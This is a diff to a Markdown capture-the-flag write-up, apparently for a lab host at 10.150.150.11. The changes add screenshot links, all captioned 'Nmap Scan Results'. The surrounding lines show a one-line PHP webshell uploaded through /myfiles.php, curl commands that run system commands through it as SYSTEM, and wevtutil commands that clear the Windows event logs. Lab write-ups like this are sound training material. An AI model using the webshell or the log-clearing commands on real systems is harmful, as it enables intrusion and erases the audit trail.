@@ -33,6 +33,7 @@ gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x 
 ```
 ![Nmap Scan Results](screenshots/gobuster.png)
 ![Nmap Scan Results](screenshots/gobuster2.png)
+
 Interesting Findings
 /admin/ - Admin panel
 
@@ -70,6 +71,7 @@ Created shell.php:
 <?php system($_GET['cmd']); ?>
 ```
 2. Uploaded via /myfiles.php
+![Nmap Scan Results](screenshots/upload-shell-file.png)
 
 3. Accessed at /upload/2/shell.php
 
@@ -77,6 +79,7 @@ Getting SYSTEM Access
 ``` bash
 curl "http://10.150.150.11/upload/2/shell.php?cmd=whoami"
 ```
+![Nmap Scan Results](screenshots/output-webshell.png)
 Output: nt authority\system
 
 ## Phase 5: Capturing the Flag
@@ -110,6 +113,7 @@ Clearing Logs:
 curl "http://10.150.150.11/upload/2/shell.php?cmd=wevtutil%20cl%20System"
 curl "http://10.150.150.11/upload/2/shell.php?cmd=wevtutil%20cl%20Application"
 ```
+![Nmap Scan Results](screenshots/delete-webshell.png)
 ## Tools Used
 1. Nmap
 2. Gobuster
